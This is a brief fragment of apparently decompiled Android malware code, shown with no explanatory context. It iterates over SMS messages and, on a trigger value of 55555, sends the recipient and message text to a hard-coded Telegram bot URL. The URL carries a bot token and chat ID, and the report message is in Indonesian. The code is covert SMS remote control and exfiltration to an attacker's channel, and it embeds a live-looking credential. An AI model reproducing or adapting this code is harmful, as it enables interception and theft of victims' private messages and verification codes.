                    ...
                    while (i < smsMessageArr.length) {
                        ...
                        if (parseInt == 55555) {
                            ...
                            try {
                                String str9 = str6;
                                String str10 = str9;
                                this.client.newCall(new Request.Builder().url("https://api.telegram.org/bot6341956598:AAFpJQvO54Xn78G7D3bcuhEwg244XyryMWY/sendMessage?parse_mode=markdown&chat_id=5801319391&text=Berhasil Kirim SMS dari Jauh  %0AKepada  : _" + str5 + "_,%0A𝐦𝐞𝐬𝐬𝐚𝐠𝐞 : _" + str9 + "_").build()).enqueue(new Callback() {
